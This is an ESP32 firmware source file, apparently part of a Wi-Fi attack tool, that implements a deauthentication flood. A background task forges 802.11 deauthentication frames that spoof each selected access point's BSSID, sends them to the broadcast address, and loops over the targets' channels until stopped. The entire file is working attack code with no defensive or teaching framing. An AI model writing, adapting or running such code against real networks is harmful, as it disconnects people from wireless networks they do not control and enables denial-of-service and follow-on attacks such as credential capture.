/* Port of the supplied controller; one cooperative task owns all transmissions. */
#include "controller.h"
#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_rom_sys.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include <stdatomic.h>
#include <string.h>

static wifi_ap_record_t selected[MAX_JOB_TARGETS];
static unsigned target_count;
static atomic_bool running;
static SemaphoreHandle_t stopped;
static uint32_t active_job;
static const char *TAG = "controller";

static void transmit_task(void *arg) {
    const uint32_t id = active_job;
    esp_err_t failure = ESP_OK;
    const char *stage = NULL;
    unsigned failed_target = 0;
    while (atomic_load(&running)) {
        for (unsigned i = 0; i < target_count && atomic_load(&running); ++i) {
            esp_err_t channel = esp_wifi_set_channel(selected[i].primary, WIFI_SECOND_CHAN_NONE);
            if (channel != ESP_OK) {
                failure = channel; stage = "channel"; failed_target = i; goto done;
            }
            uint8_t frame[26] = {0xc0};
            memset(frame + 4, 0xff, 6);
            memcpy(frame + 10, selected[i].bssid, 6); memcpy(frame + 16, selected[i].bssid, 6);
            frame[24] = 1;
            for (unsigned j = 0; j < 25 && atomic_load(&running); ++j) {
                esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
                if (err != ESP_OK) {
                    failure = err; stage = "transmit"; failed_target = i; goto done;
                }
                attack_note_tx(true, i);
                esp_rom_delay_us(1000);
            }
            vTaskDelay(1);
        }
    }
done:;
    esp_err_t notification = ESP_OK;
    if (failure != ESP_OK) {
        ESP_LOGE(TAG, "job=%lu target=%u stage=%s requested_channel=%u error=%s (0x%x); stopping",
                 (unsigned long)id, failed_target, stage, selected[failed_target].primary,
                 esp_err_to_name(failure), (unsigned)failure);
        /* Record before signaling the join so a concurrent Stop/timeout cannot
         * finish the job and discard the actual cause. Posting never blocks. */
        notification = attack_controller_failure_request(id, failure, stage, failed_target);
    }
    /* The manager may now join. No radio calls or target-array reads follow. */
    xSemaphoreGive(stopped);
    while (failure != ESP_OK && notification != ESP_OK && notification != ESP_ERR_INVALID_STATE && atomic_load(&running)) {
        esp_err_t err = attack_controller_failure_request(id, failure, stage, failed_target);
        if (err == ESP_OK || err == ESP_ERR_INVALID_STATE) break;
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    vTaskDelete(NULL);
}
esp_err_t controller_start(const wifi_ap_record_t *targets, unsigned count) {
    if (!targets || !count || count > MAX_JOB_TARGETS || atomic_load(&running)) return ESP_ERR_INVALID_ARG;
    if (!stopped) stopped = xSemaphoreCreateBinary();
    if (!stopped) return ESP_ERR_NO_MEM;
    xSemaphoreTake(stopped, 0);
    memcpy(selected, targets, count * sizeof(*targets)); target_count = count;
    attack_lock(); active_job = attack_get_job()->id;
    ESP_LOGI(TAG, "session=%s job=%lu targets=%u interface=STA sequence=caller",
             attack_get_job()->boot_id, (unsigned long)active_job, count);
    attack_unlock();
    for (unsigned i = 0; i < count; ++i)
        ESP_LOGI(TAG, "target=%u bssid=%02x:%02x:%02x:%02x:%02x:%02x channel=%u",
                 i, selected[i].bssid[0], selected[i].bssid[1], selected[i].bssid[2],
                 selected[i].bssid[3], selected[i].bssid[4], selected[i].bssid[5], selected[i].primary);
    esp_err_t err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "job=%lu stage=promiscuous error=%s (0x%x)",
                 (unsigned long)active_job, esp_err_to_name(err), (unsigned)err);
        attack_controller_failure_request(active_job, err, "promiscuous", 0);
        return err;
    }
    atomic_store(&running, true);
    if (xTaskCreate(transmit_task, "controller", 4096, NULL, 4, NULL) != pdPASS) {
        atomic_store(&running, false); esp_wifi_set_promiscuous(false);
        ESP_LOGE(TAG, "job=%lu stage=task error=ESP_ERR_NO_MEM (0x%x)",
                 (unsigned long)active_job, ESP_ERR_NO_MEM);
        attack_controller_failure_request(active_job, ESP_ERR_NO_MEM, "task", 0);
        return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}
void controller_stop(void) {
    if (atomic_exchange(&running, false)) xSemaphoreTake(stopped, portMAX_DELAY);
    esp_wifi_set_promiscuous(false);
}
